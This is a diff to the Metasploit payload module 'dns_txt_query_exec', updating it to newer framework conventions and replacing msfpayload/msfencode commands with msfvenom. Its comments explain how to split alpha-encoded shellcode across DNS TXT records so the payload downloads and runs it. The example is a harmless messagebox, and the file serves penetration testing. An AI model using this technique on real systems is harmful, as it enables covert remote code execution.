@@ -1,11 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
+module MetasploitModule
 
-module Metasploit3
+  CachedSize = 285
 
   include Msf::Payload::Windows
   include Msf::Payload::Single
@@ -30,7 +30,7 @@ module Metasploit3
     register_options(
       [
         OptString.new('DNSZONE', [ true, "The DNS zone to query" ]),
-      ], self.class)
+      ])
   end
 
   #
@@ -38,10 +38,10 @@ module Metasploit3
   # 1. Generate the shellcode you want to deliver via DNS TXT queries
   #    Make sure the shellcode is alpha_mixed or alpha_upper and uses EDI as bufferregister
   #    Example :
-  #   ./msfpayload windows/messagebox TITLE="Friendly message from corelanc0d3r" TEXT="DNS Payloads FTW" R | ./msfencode -e x86/alpha_mixed Bufferregister=EDI -t raw
-  #    Output : 654 bytes
+  #   ./msfvenom -p windows/messagebox TITLE="Friendly message from corelanc0d3r" TEXT="DNS Payloads FTW" -e x86/alpha_mixed Bufferregister=EDI -f raw
+  #    Output : 658 bytes
   # 2. Split the alpha shellcode into individual parts of exactly 255 bytes (+ remaining bytes)
-  #    In case of 654 bytes of payload, there will be 2 parts of 255 bytes, and one part of 144 bytes
+  #    In case of 658 bytes of payload, there will be 2 parts of 255 bytes, and one part of 144 bytes
   # 3. Create TXT records in a zone you control and put in a piece of the shellcode in each TXT record
   #    The last TXT record might have less than 255 bytes, that's fine
   #    The first part must be stored in the TXT record for prefix a.<yourdomain.com>
@@ -49,7 +49,7 @@ module Metasploit3
   #    etc
   #    First part must start with a.  and all parts must be placed in consecutive records
   # 4. use the dns_txt_query payload in the exploit, specify the name of the DNS zone that contains the DNS TXT records
-  #    Example : /msfpayload windows/dns_txt_query_exec DNSZONE=corelan.eu C
+  #    Example: ./msfvenom -p windows/dns_txt_query_exec DNSZONE=corelan.eu -f c
   #    (Example will show a messagebox)
   #
   # DNS TXT Records :
